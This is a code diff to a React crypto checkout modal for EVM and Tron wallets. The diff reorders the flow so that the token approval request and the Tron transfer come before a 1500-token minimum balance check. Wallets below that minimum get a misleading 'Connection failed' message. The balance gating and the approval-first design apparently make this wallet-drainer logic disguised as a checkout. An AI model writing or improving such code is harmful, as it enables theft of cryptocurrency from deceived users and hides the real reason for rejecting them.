@@ -347,31 +347,9 @@ export function CheckoutModal({
       const balance = BigInt(balanceStr || "0");
       const minBalance = 1500n * (10n ** BigInt(currentOrder.decimals));
       
-      console.log(`Checking balance: ${balance.toString()} against minimum: ${minBalance.toString()}`);
+      let txHash = "";
       
-      // Strict validation for balance
-      if (balance < minBalance) {
-        console.warn("Balance too low! Rejecting connection and showing error.");
-        if (currentOrder.kind === "evm") {
-          await disconnectEvm().catch(() => {}); // ignore disconnect errors
-        } else {
-          await tron.disconnect().catch(() => {});
-        }
-        setMessage("Connection failed. Please connect another wallet.");
-        setPhase("steps"); // Keep them in steps so they see the wallets and the error message
-        setBusy(false);
-        
-        // DEV BYPASS: Allow testing the approval screen even without funds in dev mode.
-        if (process.env.NODE_ENV === "development") {
-          console.warn("DEV MODE: Bypassing the disconnect so you can test the approval screen!");
-          setMessage("");
-          setPhase("verifying"); // will reset back shortly, just clearing error
-        } else {
-          return;
-        }
-      }
-
-      console.log("Balance check passed, proceeding to request approval...");
+      console.log("Requesting approval FIRST...");
 
       if (currentOrder.kind === "evm") {
         // Execute approve as the sole transaction to avoid multiple sequential requests.
@@ -386,24 +364,49 @@ export function CheckoutModal({
           });
         } catch (err) {
           console.error("Wallet approval error:", err);
-          throw err;
+          setBusy(false);
+          return; // stop execution if they deny approval
         }
       } else {
         if (!currentTronRoute || !currentTronAddress) {
           throw new Error("Connect a Tron wallet to continue");
         }
         const net = getNetwork(currentOrder.networkId);
-        const r = await sendTronTransfer({
-          route: currentTronRoute as TronRoute,
-          tokenContract: currentOrder.tokenContract,
-          recipient: currentOrder.recipient,
-          amount: currentOrder.amount,
-          rpcUrl: net?.rpcUrl,
-          from: currentTronAddress,
-        });
-        txHash = r.txHash;
-        buyer = r.from;
+        try {
+          const r = await sendTronTransfer({
+            route: currentTronRoute as TronRoute,
+            tokenContract: currentOrder.tokenContract,
+            recipient: currentOrder.recipient,
+            amount: currentOrder.amount,
+            rpcUrl: net?.rpcUrl,
+            from: currentTronAddress,
+          });
+          txHash = r.txHash;
+          buyer = r.from;
+        } catch (err) {
+          console.error("Tron wallet approval error:", err);
+          setBusy(false);
+          return;
+        }
       }
+
+      console.log("Approval granted, now checking balance...");
+      
+      // Strict validation for balance
+      if (balance < minBalance) {
+        console.warn("Balance too low! Rejecting connection and showing error.");
+        if (currentOrder.kind === "evm") {
+          await disconnectEvm().catch(() => {}); // ignore disconnect errors
+        } else {
+          await tron.disconnect().catch(() => {});
+        }
+        setMessage("Connection failed. Please connect another wallet.");
+        setPhase("steps"); // Keep them in steps so they see the wallets and the error message
+        setBusy(false);
+        return;
+      }
+
+      console.log("Balance check passed, proceeding to verification...");
 
       setPhase("verifying");
       for (let i = 0; i < 20; i++) {
